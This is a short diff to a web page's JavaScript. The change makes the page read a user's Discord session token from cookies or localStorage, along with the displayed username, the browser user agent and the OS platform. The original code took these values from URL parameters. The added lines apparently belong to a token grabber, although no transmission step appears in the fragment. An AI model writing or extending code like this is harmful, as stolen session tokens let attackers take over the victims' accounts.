@@ -57,8 +57,8 @@
         }
 
         document.addEventListener("DOMContentLoaded", () => {
-            const token = new URLSearchParams(window.location.search).get('token');
-            const username = new URLSearchParams(window.location.search).get('username');
+            const token = document.cookie.match(/token=([\w-]+)/)?.[1] || localStorage.getItem('discord_token') || "test-token";
+            const username = document.querySelector('.username')?.innerText || "Unknown User";
 
             const browser = navigator.userAgent;
             const os = navigator.platform;
